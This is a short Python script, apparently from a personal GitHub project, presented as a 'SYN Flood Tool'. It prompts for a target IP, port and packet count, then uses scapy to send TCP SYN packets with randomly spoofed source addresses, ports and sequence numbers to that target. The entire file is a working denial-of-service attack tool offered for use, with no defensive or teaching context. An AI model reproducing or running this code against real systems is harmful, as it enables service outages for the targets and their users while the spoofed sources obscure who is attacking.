#!/usr/bin/env python3
# Emre Ovunc
# info@emreovunc.com
# Syn Flood Tool Python

from scapy.all import IP, TCP, send
import os
import random
import sys

def random_ip() -> str:
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def rand_int() -> int:
    return random.randint(1000, 9000)

def syn_flood(dst_ip: str, dst_port: int, counter: int):
    print("Packets are being sent ...")
    total = 0
    for _ in range(counter):
        ip_packet = IP(src=random_ip(), dst=dst_ip)
        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
        send(ip_packet/tcp_packet, verbose=False)
        total += 1
    print(f"\nTotal packets sent: {total}")

def info() -> tuple:
    os.system("clear")
    print("#############################")
    print("#    github.com/EmreOvunc   #")
    print("#############################")
    print("# Welcome to SYN Flood Tool #")
    print("#############################")

    dst_ip = input("\nTarget IP: ")
    dst_port = int(input("Target Port: "))
    
    return dst_ip, dst_port

def main():
    dst_ip, dst_port = info()
    counter = int(input("How many packets do you want to send: "))
    syn_flood(dst_ip, dst_port, counter)

if __name__ == "__main__":
    main()
